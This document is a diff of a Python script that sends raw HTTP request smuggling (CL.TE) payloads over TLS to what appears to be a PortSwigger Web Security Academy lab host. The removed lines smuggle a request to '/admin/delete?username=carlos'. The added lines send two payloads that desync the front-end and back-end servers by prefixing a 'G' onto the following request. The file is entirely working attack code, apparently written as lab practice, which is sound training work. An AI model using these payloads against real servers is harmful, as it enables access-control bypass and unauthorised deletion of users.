@@ -1,40 +1,32 @@
 import socket
 import ssl
 
-host = '0ac7004a040e0ca682bafb6600ec00eb.web-security-academy.net'
+host = '0a59008303ae15f3e1c9bb7000ed00d1.web-security-academy.net'
 port = 443
 
 # Smuggling payload (CL.TE)
-payload = (
+payload1 = (
     "POST / HTTP/1.1\r\n"
     f"Host: {host}\r\n"
+    "Connection: keep-alive\r\n"
     "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Content-Length: 140\r\n"
+    "Content-Length: 6\r\n" #6 = line16-18
     "Transfer-Encoding: chunked\r\n"
     "\r\n"
     "0\r\n"
     "\r\n"
-    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
-    "Host: localhost\r\n"
-    "Content-Type: application/x-www-form-urlencoded\r\n"
-    "Content-Length: 4\r\n"
-    "\r\n"
-    "x=\r\n"
+    "G"
 )
 
-# body = (
-#     "0\r\n"
-#     "\r\n"
-#     "GET /admin/delete?username=carlos HTTP/1.1\r\n"
-#     "Host: localhost\r\n"
-#     "Content-Type: application/x-www-form-urlencoded\r\n"
-#     "Content-Length: 4\r\n"
-#     "\r\n"
-#     "x=\r\n"
-# )
-# print(len(body)) #140
-
-# print(len("x=\r\n"))  #4
+payload2 = (
+    "POST / HTTP/1.1\r\n"
+    f"Host: {host}\r\n"
+    "Content-Type: application/x-www-form-urlencoded\r\n"
+    "Content-Length: 9\r\n" #9 = line27
+    "\r\n"
+    "rat=rat\r\n" 
+    "\r\n"
+)
 
 def send_raw_https(host, port, raw_payload):
     context = ssl.create_default_context()
@@ -44,5 +36,7 @@ def send_raw_https(host, port, raw_payload):
             response = ssock.recv(4096)
             print(response.decode(errors="ignore"))
 
-print("[+] Sending smuggling payload...")
-send_raw_https(host, port, payload)
+print("[+] Sending payload 1...")
+send_raw_https(host, port, payload1)
+print("[+] Sending payload 2...")
+send_raw_https(host, port, payload2)
